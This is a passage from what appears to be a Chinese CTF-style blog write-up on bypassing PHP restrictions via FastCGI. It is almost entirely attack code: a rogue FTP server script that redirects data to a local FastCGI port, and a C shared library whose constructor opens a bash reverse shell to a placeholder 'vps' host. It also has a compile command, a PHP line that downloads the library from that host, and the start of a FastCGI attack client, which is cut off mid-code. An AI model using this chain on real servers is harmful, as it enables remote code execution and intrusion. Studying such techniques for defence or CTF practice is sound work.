class="comment">//evil_ftp.py</span></span><br><span class="line">import socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">23</span>))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 welcome\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Service ready for new user.</span></span><br><span class="line"><span class="comment">#Client send anonymous username</span></span><br><span class="line"><span class="comment">#USER anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;331 Please specify the password.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User name okay, need password.</span></span><br><span class="line"><span class="comment">#Client send anonymous password.</span></span><br><span class="line"><span class="comment">#PASS anonymous</span></span><br><span class="line">conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#User logged in, proceed. Logged out if appropriate.</span></span><br><span class="line"><span class="comment">#TYPE I</span></span><br><span class="line">conn.send(<span class="string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#Size /</span></span><br><span class="line">conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#EPSV (1)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 ok\n&#x27;</span>)</span><br><span class="line"><span class="comment">#PASV</span></span><br><span class="line">conn.send(<span class="string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n&#x27;</span>) <span class="comment">#STOR / (2)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line"><span class="comment">#QUIT</span></span><br><span class="line">conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><h4 id="构造恶意so文件反弹shell"><a href="#构造恶意so文件反弹shell" class="headerlink" title="构造恶意so文件反弹shell"></a>构造恶意so文件反弹shell</h4><p>写一个扩展，直接反弹shell：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//evil.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译evil.c文件，得到evil.so：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc evil.c -fPIC -shared -o evil.so</span><br></pre></td></tr></table></figure><p>将so文件上传到/tmp目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy(&#39;http:&#x2F;&#x2F;vps&#x2F;evil.so&#39;,&#39;&#x2F;tmp&#x2F;evil.so&#39;);</span><br><span class="line">var_dump(glob(&#39;&#x2F;tmp&#x2F;*&#39;));</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210503170253488.png" alt="image-20210503170253488"></p><h4 id="Fastcgi攻击payload"><a href="#Fastcgi攻击payload" class="headerlink" title="Fastcgi攻击payload"></a>Fastcgi攻击payload</h4><p>攻击fastcgi的脚本，加载evil.so文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note : Code is released under the GNU LGPL</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Please do not change the header of this file</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is free software; you can redistribute it and/or modify it under the terms of the GNU</span></span><br><span class="line"><span class="comment"> * Lesser General Public License as published by the Free Software Foundation; either version 2 of</span></span><br><span class="line"><span class="comment"> * the License, or (at your option) any later version.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;</span></span><br><span class="line"><span class="comment"> * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See the GNU Lesser General Public License for more details.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Handles communication with a FastCGI application</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Pierrick Charron &lt;pierrick<span class="doctag">@webstart</span>.fr&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>     1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCGIClient</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> VERSION_1            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> BEGIN_REQUEST        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> ABORT_REQUEST        = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> END_REQUEST          = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> PARAMS               = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">const</span> STDIN                = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">const</span> STDOUT               = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">const</span> STDERR               = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">const</span> DATA                 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES           = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES_RESULT    = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_TYPE         = <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">const</span> MAXTYPE              = <span class="built_in">self</span>::UNKNOWN_TYPE;</span><br><span class="line">    <span class="keyword">const</span> RESPONDER            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> AUTHORIZER           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> FILTER               = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> REQUEST_COMPLETE     = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> CANT_MPX_CONN        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> OVERLOADED           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_ROLE         = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> MAX_CONNS            = <span class="string">&#x27;MAX_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> MAX_REQS             = <span class="string">&#x27;MAX_REQS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> MPXS_CONNS           = <span class="string">&#x27;MPXS_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> HEADER_LEN           = <span class="number">8</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Socket</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Resource</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sock</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Host</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_host</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Port</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_port</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Keep Alive</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Boolean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_keepAlive</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $host Host of the FastCGI application</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $port Port of the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$port</span> = <span class="number">9001</span></span>) // <span class="title">and</span> <span class="title">default</span> <span class="title">value</span> <span class="title">for</span> <span class="title">port</span>, <span class="title">just</span> <span class="title">for</span> <span class="title">unixdomain</span> <span class="title">socket</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_host = <span class="variable">$host</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_port = <span class="variable">$port</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Define whether or not the FastCGI application should keep the connection</span></span><br><span class="line"><span class="comment">     * alive at the end of a request</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Boolean $b true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setKeepAlive</span>(<span class="params"><span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_keepAlive = (<span class="keyword">boolean</span>)<span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_keepAlive &amp;&amp; <span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            fclose(<span class="keyword">$this</span>-&gt;_sock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the keep alive status</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Boolean true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getKeepAlive</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_keepAlive;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a connection to the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            <span class="comment">//$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;_sock = stream_socket_client(<span class="keyword">$this</span>-&gt;_host, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">5</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unable to connect to FastCGI application&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build a FastCGI packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $type Type of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $content Content of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $requestId RequestId</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPacket</span>(<span class="params"><span class="variable">$type</span>, <span class="variable">$content</span>, <span class="variable">$requestId</span> = <span class="number">1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$clen</span> = strlen(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">return</span> chr(<span class="built_in">self</span>::VERSION_1)         <span class="comment">/* version */</span></span><br><span class="line">            . chr(<span class="variable">$type</span>)                    <span class="comment">/* type */</span></span><br><span class="line">            . chr((<span class="variable">$requestId</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) <span class="comment">/* requestIdB1 */</span></span><br><span class="line">            . chr(<span class="variable">$requestId</span> &amp; <span class="number">0xFF</span>)        <span class="comment">/* requestIdB0 */</span></span><br><span class="line">            . chr((<span class="variable">$clen</span> &gt;&gt; <span class="number">8</span> ) &amp; <span class="number">0xFF</span>)     <span class="comment">/* contentLengthB1 */</span></span><br><span class="line">            . chr(<span class="variable">$clen</span> &amp; <span class="number">0xFF</span>)             <span class="comment">/* contentLengthB0 */</span></span><br><span class="line">            . chr(<span class="number">0</span>)                        <span class="comment">/* paddingLength */</span></span><br><span class="line">            . chr(<span class="number">0</span>)                        <span class="comment">/* reserved */</span></span><br><span class="line">            . <span class="variable">$content</span>;                     <span class="comment">/* content */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build an FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $name Name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $value Value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildNvpair</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$nlen</span> = strlen(<span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$vlen</span> = strlen(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$nlen</span> &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> = chr(<span class="variable">$nlen</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> = chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr(<span class="variable">$nlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$vlen</span> &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> .= chr(<span class="variable">$vlen</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> .= chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr((<span class="variable">$vlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr(<span class="variable">$vlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* nameData &amp; valueData */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$nvpair</span> . <span class="variable">$name</span> . <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a set of FastCGI Name value pairs</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data Data containing the set of FastCGI NVPair</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array of NVPair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readNvpair</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$length</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$length</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable">$length</span> = strlen(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$p</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$p</span> != <span class="variable">$length</span>) &#123;</span><br><span class="line">            <span class="variable">$nlen</span> = ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$nlen</span> &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                <span class="variable">$nlen</span> = (<span class="variable">$nlen</span> &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$vlen</span> = ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$vlen</span> &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                <span class="variable">$vlen</span> = (<span class="variable">$nlen</span> &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (ord(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$array</span>[substr(<span class="variable">$data</span>, <span class="variable">$p</span>, <span class="variable">$nlen</span>)] = substr(<span class="variable">$data</span>, <span class="variable">$p</span>+<span class="variable">$nlen</span>, <span class="variable">$vlen</span>);</span><br><span class="line">            <span class="variable">$p</span> += (<span class="variable">$nlen</span> + <span class="variable">$vlen</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Decode a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data String containing all the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">decodePacketHeader</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;version&#x27;</span>]       = ord(<span class="variable">$data</span>&#123;<span class="number">0</span>&#125;);</span><br><span class="line">        <span 